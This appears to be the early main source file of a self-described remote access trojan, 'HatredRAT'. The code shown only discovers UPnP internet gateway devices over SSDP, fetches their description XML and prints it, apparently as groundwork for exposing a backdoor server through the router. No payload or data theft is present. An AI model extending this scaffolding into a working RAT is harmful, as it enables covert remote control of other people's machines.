// for educational purposes only

#include <sys/socket.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <poll.h>

#include "./ssdp.h"
#include "./util.h"
#include "./upnp.h"
#include "./net.h"
#include "./http.h"
#include "./xml.h"

#define IPV4_ADDR_STR_LEN 16

#define PROTO_INET 0

using namespace hatred;

void xml_print(xml::xml_node* node, int depth) {
    printf("%*s<%s%s", depth, "", node->pi ? "?" : "", node->name.c_str());
    
    for (auto [k, v] : node->attributes) printf(" %s=\"%s\"", k.c_str(), v.c_str());
    
    if (node->pi) {
        printf("?>\n");
        return;
    }

    if (node->leaf) {
        printf(">%s</%s>\n", node->value.c_str(), node->name.c_str());
        return;
    }

    if (node->children.size() == 0) {
        printf("/>\n");
        return;
    } 

    printf(">\n");

    for (auto i : node->children) {
        xml_print(&i, depth + 1);
    }

    printf("%*s</%s>\n", depth, "", node->name.c_str());
}

int main() {
    DPRINTF("HatredRAT version 1.\n"
            "FOR EDUCATIONAL PURPOSES ONLY.\n");

    DPRINTF("attempting to start server\n");

    DPRINTF("try upnp\n");

    int upnpsock = socket(AF_INET, SOCK_DGRAM, PROTO_INET);
    
    upnp::send_msearch_m(upnpsock, {
        .max_wait = 1,
        .search_target = "urn:schemas-upnp-org:device:InternetGatewayDevice:1"
    });

    ssdp::ssdp_message message = ssdp::ssdp_message();
    while (ssdp::recv_message(message, upnpsock, 100) >= 0) {
        if (message.header.contains("ST") && message.header["ST"] == "urn:schemas-upnp-org:device:InternetGatewayDevice:1") {
            for (const auto& [k, v] : message.header) {
                DPRINTF("GOT FIELD \"%s:%s\"\n", k.c_str(), v.c_str());
            }

            if (message.header.contains("LOCATION")) {
                std::string loc = message.header["LOCATION"];

                DPRINTF("REQUEST INFO FOR \"%s\"\n", loc.c_str());
                
                int httpsock = socket(AF_INET, SOCK_STREAM, PROTO_INET); // XXX: @xwashere WHAT THE FUCK SOCK_STREAM DOESNT FIX FIX NOW FUCK YOUY

                http::connect(httpsock, loc);

                if (http::send_message({
                    .url = loc,
                    .header = { {"CPFN.UPNP.ORG", "asfdasfd"} }
                }, httpsock, 100) >= 0) {
                    http::http_message msg;
                    if (http::recv_message(msg, httpsock, 100) >= 0) {
                        DPRINTF("status: %i %s\n", msg.status, msg.status_reason.c_str());
                        for (const auto& [k, v] : msg.header) {
                            DPRINTF("header \"%s:%s\"\n", k.c_str(), v.c_str());
                        }
                        DPRINTF("=== body\n%s\n===\n", msg.body.c_str());

                        xml::xml_node* node = xml::xml_parse(msg.body);

                        if (node) {
                            xml_print(node, 0);
                        }
                    }
                } else {
                    DPRINTF("failed to get igd info");
                }
            }
        }

        message = ssdp::ssdp_message();
    }

    return 0;
}